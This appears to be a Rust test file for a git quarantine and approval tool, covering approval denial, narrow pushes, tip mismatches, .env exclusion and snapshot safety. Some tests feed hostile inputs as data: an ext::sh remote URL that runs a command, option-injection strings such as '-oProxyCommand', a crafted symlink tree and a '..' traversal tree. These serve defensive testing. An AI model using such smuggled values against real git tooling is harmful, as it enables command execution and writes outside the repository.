    impl Approver for Broken {
        fn decide(&self, _: &ApprovalRequest<'_>) -> Result<Decision, ApproverError> {
            Err(ApproverError("sensor failed".to_string()))
        }
    }
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let review = lab.quarantine.review(None, &tip).unwrap();
    let denied = approve(&No, &tip, &review).unwrap_err();
    assert!(matches!(denied, Error::ApprovalDenied(_)));
    assert!(!denied.to_string().contains('\x1b'));
    assert!(matches!(
        approve(&Broken, &tip, &review),
        Err(Error::ApproverFailed(_))
    ));
}

#[test]
fn push_creates_only_the_task_ref_on_the_remote() {
    let mut lab = Lab::new();
    commit_file(&lab.src, "a.txt", b"1\n", "one");
    plain_git(&lab.src, &["tag", "v1"]);
    plain_git(&lab.src, &["tag", "-a", "v2", "-m", "annotated"]);
    plain_git(&lab.src, &["branch", "other"]);
    let tip = commit_file(&lab.src, "a.txt", b"2\n", "two");
    plain_git(&lab.src, &["tag", "v3"]);
    plain_git(
        &lab.src,
        &["bundle", "create", "-q", "../all.bundle", "--all"],
    );
    lab.quarantine
        .import_bundle(&lab.root.join("all.bundle"), 64 * MB)
        .unwrap();

    let receipt = lab.push_ok(&tip, "only-this").unwrap();
    let expected = lab.task_ref("only-this");
    assert_eq!(receipt.remote_ref, expected);
    assert_eq!(receipt.commit, tip);
    assert_eq!(lab.remote_refs(), std::slice::from_ref(&expected));
    assert_eq!(plain_git(&lab.remote, &["rev-parse", &expected]), tip);
    assert_eq!(plain_git(&lab.remote, &["tag", "--list"]), "");
    assert_eq!(
        receipt.tree,
        plain_git(&lab.remote, &["rev-parse", &format!("{tip}^{{tree}}")])
    );
}

#[test]
fn only_history_of_the_approved_commit_reaches_the_remote() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    plain_git(&lab.src, &["checkout", "-q", "-b", "hidden"]);
    let hidden = commit_file(&lab.src, "secret.txt", b"not approved\n", "hidden");
    plain_git(&lab.src, &["checkout", "-q", "main"]);
    lab.import();
    lab.push_ok(&tip, "narrow").unwrap();
    assert!(plain_git_status(&lab.remote, &["cat-file", "-e", &tip]));
    assert!(!plain_git_status(&lab.remote, &["cat-file", "-e", &hidden]));
}

#[test]
fn non_fast_forward_push_is_rejected() {
    let mut lab = Lab::new();
    let root = commit_file(&lab.src, "a.txt", b"0\n", "root");
    let first = commit_file(&lab.src, "a.txt", b"1\n", "one");
    plain_git(&lab.src, &["checkout", "-q", "-b", "diverged", &root]);
    let second = commit_file(&lab.src, "a.txt", b"2\n", "two");
    lab.import();

    lab.push_ok(&first, "task").unwrap();
    let err = lab.push_ok(&second, "task").unwrap_err();
    assert!(matches!(err, Error::NonFastForward), "{err}");
    let task_ref = lab.task_ref("task");
    assert_eq!(plain_git(&lab.remote, &["rev-parse", &task_ref]), first);
    assert_eq!(lab.remote_refs(), [task_ref]);
}

#[test]
fn a_fast_forward_to_the_same_task_works() {
    let mut lab = Lab::new();
    let first = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    lab.push_ok(&first, "task").unwrap();
    let second = commit_file(&lab.src, "a.txt", b"2\n", "two");
    lab.import();
    lab.push_ok(&second, "task").unwrap();
    assert_eq!(
        plain_git(&lab.remote, &["rev-parse", &lab.task_ref("task")]),
        second
    );
}

#[test]
fn push_fails_if_a_new_import_moved_the_tip_after_approval() {
    let mut lab = Lab::new();
    let approved = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let review = lab.quarantine.review(None, &approved).unwrap();
    let approval = approve(&FakeApprover::default(), &approved, &review).unwrap();

    // The VM proposes something else after the person approved.
    commit_file(&lab.src, "a.txt", b"evil\n", "swap");
    lab.import();

    let auth = PushAuth::none().allowing_local_remote();
    let err = lab
        .quarantine
        .push(approval, lab.remote.to_str().unwrap(), "task", &auth)
        .unwrap_err();
    assert!(matches!(err, Error::TipMismatch { .. }), "{err}");
    assert!(lab.remote_refs().is_empty());
}

#[test]
fn push_fails_if_the_quarantine_ref_was_moved_after_approval() {
    let mut lab = Lab::new();
    let first = commit_file(&lab.src, "a.txt", b"1\n", "one");
    let approved = commit_file(&lab.src, "a.txt", b"2\n", "two");
    lab.import();
    let review = lab.quarantine.review(None, &approved).unwrap();
    let approval = approve(&FakeApprover::default(), &approved, &review).unwrap();

    plain_git(
        lab.quarantine.path(),
        &["update-ref", "refs/quarantine/1/heads/main", &first],
    );

    let auth = PushAuth::none().allowing_local_remote();
    let err = lab
        .quarantine
        .push(approval, lab.remote.to_str().unwrap(), "task", &auth)
        .unwrap_err();
    // The approved commit is no longer reachable from any quarantine ref at all.
    assert!(
        matches!(
            err,
            Error::CommitNotInQuarantine(_) | Error::TipMismatch { .. }
        ),
        "{err}"
    );
    assert!(lab.remote_refs().is_empty());
}

#[test]
fn re_importing_the_same_tip_keeps_the_approval_valid() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let review = lab.quarantine.review(None, &tip).unwrap();
    let approval = approve(&FakeApprover::default(), &tip, &review).unwrap();
    lab.import();
    let auth = PushAuth::none().allowing_local_remote();
    lab.quarantine
        .push(approval, lab.remote.to_str().unwrap(), "task", &auth)
        .unwrap();
}

#[test]
fn push_rejects_a_commit_that_left_the_quarantine() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let review = lab.quarantine.review(None, &tip).unwrap();
    let approval = approve(&FakeApprover::default(), &tip, &review).unwrap();
    let qdir = lab.quarantine.path().to_path_buf();
    plain_git(&qdir, &["update-ref", "-d", "refs/quarantine/1/heads/main"]);
    let auth = PushAuth::none().allowing_local_remote();
    let err = lab
        .quarantine
        .push(approval, lab.remote.to_str().unwrap(), "task", &auth)
        .unwrap_err();
    assert!(matches!(err, Error::CommitNotInQuarantine(_)), "{err}");
    assert!(lab.remote_refs().is_empty());
}

#[test]
fn push_rejects_bad_task_names_and_remote_urls() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let remote = lab.remote.to_str().unwrap().to_string();
    let auth = PushAuth::none().allowing_local_remote();
    let fresh = |lab: &Lab| {
        let review = lab.quarantine.review(None, &tip).unwrap();
        approve(&FakeApprover::default(), &tip, &review).unwrap()
    };
    for task in [
        "", "-x", "--force", "../main", "a/b", "+x", "x:y", "HEAD", "a\nb",
    ] {
        let err = lab
            .quarantine
            .push(fresh(&lab), &remote, task, &auth)
            .unwrap_err();
        assert!(matches!(err, Error::InvalidTaskName(_)), "{task:?}: {err}");
    }
    let marker = lab.root.join("PWNED");
    let ext = format!("ext::sh -c touch% {}", marker.display());
    for url in [
        ext.as_str(),
        "fd::3",
        "-oProxyCommand=x",
        "--upload-pack=x",
        "ssh://example.invalid/r",
        "http://example.invalid/r",
        "file:///tmp/r",
    ] {
        let err = lab
            .quarantine
            .push(fresh(&lab), url, "task", &auth)
            .unwrap_err();
        assert!(matches!(err, Error::InvalidRemote(_)), "{url}: {err}");
    }
    assert!(!marker.exists());
    // A local path needs the explicit opt-in.
    let err = lab
        .quarantine
        .push(fresh(&lab), &remote, "task", &PushAuth::none())
        .unwrap_err();
    assert!(matches!(err, Error::InvalidRemote(_)), "{err}");
    assert!(lab.remote_refs().is_empty());
}

#[test]
fn https_transport_is_allowed_by_policy_and_fails_closed_without_a_server() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let review = lab.quarantine.review(None, &tip).unwrap();
    let approval = approve(&FakeApprover::default(), &tip, &review).unwrap();
    // A closed port on loopback, so this reaches no real remote.
    let err = lab
        .quarantine
        .push(
            approval,
            "https://127.0.0.1:1/r.git",
            "task",
            &PushAuth::none(),
        )
        .unwrap_err();
    let message = err.to_string();
    assert!(matches!(err, Error::PushRejected { .. }), "{message}");
    assert!(
        !message.contains("not allowed"),
        "policy blocked https: {message}"
    );
}

#[test]
fn hostile_remote_rejection_text_is_escaped() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let hooks = lab.remote.join("hooks");
    fs::create_dir_all(&hooks).unwrap();
    let hook = hooks.join("pre-receive");
    fs::write(
        &hook,
        "#!/bin/sh\nprintf '\\033[31mgotcha\\n' >&2\nexit 1\n",
    )
    .unwrap();
    fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
    let err = lab.push_ok(&tip, "task").unwrap_err();
    let message = err.to_string();
    assert!(matches!(err, Error::PushRejected { .. }), "{message}");
    assert!(!message.contains('\x1b'), "{message}");
    assert!(message.contains("gotcha"), "{message}");
}

#[test]
fn env_file_is_left_out_of_snapshot_and_reported() {
    let lab = Lab::new();
    fs::create_dir_all(lab.src.join("deep/er")).unwrap();
    for (path, body) in [
        (".env", "SECRET=root"),
        (".env.local", "SECRET=local"),
        (".ENV.PRODUCTION", "SECRET=upper"),
        ("deep/.env", "SECRET=deep"),
        ("deep/er/.env.test", "SECRET=deeper"),
        (".env.example", "SECRET=placeholder"),
        ("deep/.env.example", "SECRET=placeholder"),
        ("keep.txt", "ok"),
        ("deep/keep.txt", "ok"),
    ] {
        fs::write(lab.src.join(path), body).unwrap();
    }
    let tip = commit_all(&lab.src, "with env");
    assert!(plain_git(&lab.src, &["ls-files"]).contains(".env.local"));

    let dest = lab.root.join("snap");
    let report = snapshot(&lab.src, &tip, &dest).unwrap();

    for gone in [
        ".env",
        ".env.local",
        ".ENV.PRODUCTION",
        "deep/.env",
        "deep/er/.env.test",
    ] {
        assert!(fs::symlink_metadata(dest.join(gone)).is_err(), "{gone}");
    }
    for kept in [
        ".env.example",
        "deep/.env.example",
        "keep.txt",
        "deep/keep.txt",
    ] {
        assert!(dest.join(kept).is_file(), "{kept}");
    }
    assert_eq!(report.commit, tip);
    assert_eq!(report.files_written, 4);
    assert_eq!(report.excluded.len(), 5, "{:?}", report.excluded);
    assert!(report
        .excluded
        .iter()
        .all(|e| e.reason == ExclusionReason::EnvFile));
    assert!(report.excluded.iter().any(|e| e.path == r#"".env""#));
    assert!(report
        .excluded
        .iter()
        .any(|e| e.path == r#""deep/er/.env.test""#));
    assert!(!dest.join(".git").exists());

    // No secret values anywhere in the destination.
    let mut pending = vec![dest.clone()];
    while let Some(dir) = pending.pop() {
        for item in fs::read_dir(dir).unwrap() {
            let path = item.unwrap().path();
            if path.is_dir() {
                pending.push(path);
            } else {
                let body = fs::read_to_string(&path).unwrap();
                assert!(
                    !body.contains("SECRET=") || body.contains("placeholder"),
                    "{}",
                    path.display()
                );
            }
        }
    }
    // The report holds names only.
    assert!(!serde_json::to_string(&report).unwrap().contains("SECRET"));
}

#[test]
fn snapshot_rejects_a_traversal_tree_and_leaves_nothing() {
    let lab = Lab::new();
    commit_file(&lab.src, "a.txt", b"x\n", "first");
    let (commit, _tree, _blob) = malformed_commit(&lab.src, "100644", "..");
    let dest = lab.root.join("snap");
    let result = snapshot(&lab.src, &commit, &dest);
    // Git 2.50 refuses this tree itself, so the outer layer stops it. The crate's own
    // guard is the second layer, and `traversal_entries_abort` tests it with a
    // handwritten tar, because git will not produce one.
    match result {
        Err(Error::GitFailed {
            op: "archive",
            stderr,
            ..
        }) => {
            assert!(stderr.contains("invalid path"), "{stderr}");
        }
        other => panic!("{other:?}"),
    }
    assert!(!dest.exists(), "a partial snapshot was left behind");
}

#[test]
fn snapshot_cannot_write_through_a_case_folded_symlink() {
    let lab = Lab::new();
    commit_file(&lab.src, "a.txt", b"x\n", "first");
    let outside = lab.root.join("outside");
    fs::create_dir(&outside).unwrap();

    // `FOO` is a symlink out of the tree, and `foo/pwn` would land through it on a
    // case-insensitive filesystem. Plumbing builds a tree that a checkout could not.
    let link_blob = String::from_utf8(plain_git_stdin(
        &lab.src,
        &["hash-object", "-w", "--stdin"],
        outside.to_str().unwrap().as_bytes(),
    ))
    .unwrap()
    .trim()
    .to_string();
    let file_blob = String::from_utf8(plain_git_stdin(
        &lab.src,
        &["hash-object", "-w", "--stdin"],
        b"pwned\n",
    ))
    .unwrap()
    .trim()
    .to_string();
    let sub = String::from_utf8(plain_git_stdin(
        &lab.src,
        &["mktree"],
        format!("100644 blob {file_blob}\tpwn\n").as_bytes(),
    ))
    .unwrap()
    .trim()
    .to_string();
    let top = String::from_utf8(plain_git_stdin(
        &lab.src,
        &["mktree"],
        format!("120000 blob {link_blob}\tFOO\n040000 tree {sub}\tfoo\n").as_bytes(),
    ))
    .unwrap()
    .trim()
    .to_string();
    let commit = plain_git(&lab.src, &["commit-tree", &top, "-m", "fold"]);

    let dest = lab.root.join("snap");
    let result = snapshot(&lab.src, &commit, &dest);
    assert!(!outside.join("pwn").exists(), "wrote through the symlink");
    // Which one happens depends on whether this filesystem folds case.
    match result {
        Err(Error::SnapshotCollision(_)) => assert!(!dest.exists()),
        Ok(report) => {
            assert!(report
                .excluded
                .iter()
                .any(|e| e.reason == ExclusionReason::EscapingSymlink));
        }
        Err(other) => panic!("unexpected failure: {other}"),
    }
}

#[test]
fn snapshot_keeps_long_paths_and_modes() {
    let lab = Lab::new();
    let long = "d".repeat(120);
    let path = format!("{long}/{}/f.sh", "e".repeat(120));
    fs::create_dir_all(lab.src.join(&path).parent().unwrap()).unwrap();
    fs::write(lab.src.join(&path), b"#!/bin/sh\n").unwrap();
    fs::set_permissions(lab.src.join(&path), fs::Permissions::from_mode(0o755)).unwrap();
    fs::write(lab.src.join("plain.txt"), b"x\n").unwrap();
    symlink("plain.txt", lab.src.join("link")).unwrap();
    let tip = commit_all(&lab.src, "long");
    let dest = lab.root.join("snap");
    let report = snapshot(&lab.src, &tip, &dest).unwrap();
    assert_eq!(report.files_written, 2);
    assert_eq!(report.symlinks_written, 1);
    assert_eq!(fs::read(dest.join(&path)).unwrap(), b"#!/bin/sh\n");
    let mode = |p: &Path| fs::metadata(p).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode(&dest.join(&path)) & 0o100, 0o100);
    assert_eq!(mode(&dest.join("plain.txt")) & 0o111, 0);
    assert_eq!(
        fs::read_link(dest.join("link")).unwrap(),
        Path::new("plain.txt")
    );
}

#[test]
fn snapshot_refuses_bad_arguments() {
    let lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"x\n", "first");
    let existing = lab.root.join("existing");
    fs::create_dir(&existing).unwrap();
    assert!(matches!(
        snapshot(&lab.src, &tip, &existing),
        Err(Error::PathExists(_))
    ));

    for bad in [
        "HEAD",
        "--output=/tmp/x",
        "--remote=ext::sh",
        "main",
        &tip[..10],
    ] {
        let dest = lab.root.join("snap");
        assert!(
            matches!(
                snapshot(&lab.src, bad, &dest),
                Err(Error::InvalidCommitId(_))
            ),
            "{bad}"
        );
        assert!(!dest.exists());
    }

    let link = lab.root.join("dangling");
    symlink(lab.root.join("target"), &link).unwrap();
    assert!(matches!(
        snapshot(&lab.src, &tip, &link),
        Err(Error::PathExists(_))
    ));
    assert!(!lab.root.join("target").exists());

    assert!(snapshot(Path::new("relative"), &tip, &lab.root.join("s1")).is_err());
    let not_repo = lab.root.join("notrepo");
    fs::create_dir(&not_repo).unwrap();
    assert!(snapshot(&not_repo, &tip, &lab.root.join("s2")).is_err());
    assert!(snapshot(&lab.src, &"1".repeat(40), &lab.root.join("s3")).is_err());
    assert!(!lab.root.join("s3").exists());
}

#[test]
fn branch_prefix_comes_from_brand() {
    let mut lab = Lab::new();
    let tip = commit_file(&lab.src, "a.txt", b"1\n", "one");
    lab.import();
    let receipt = lab.push_ok(&tip, "x").unwrap();
    assert!(receipt.remote_ref.starts_with("refs/heads/"));
    assert!(receipt.remote_ref.contains(brand::BRANCH_PREFIX));
    assert!(receipt.remote_ref.ends_with("/x"));
}
